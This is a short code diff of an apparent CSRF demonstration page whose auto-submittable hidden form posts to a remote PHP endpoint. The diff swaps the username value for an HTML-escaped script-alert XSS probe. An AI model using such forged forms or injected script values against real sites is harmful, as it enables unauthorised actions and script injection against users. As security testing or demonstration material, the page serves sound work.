@@ -12,7 +12,7 @@
 <body>
     <h1>CSRF demonstration</h1>
     <form action="https://qurius-security.com/req2csrf.php" method="POST">
-        <input type="hidden" id="username" name="username" value="req2csrf">
+        <input type="hidden" id="username" name="username" value="&lt;script&gt;alert(1)&lt;/script&gt;">
 		<input type="hidden" id="password" name="password" value="req2csrf">
 		
         <input type="submit" value="Submit">
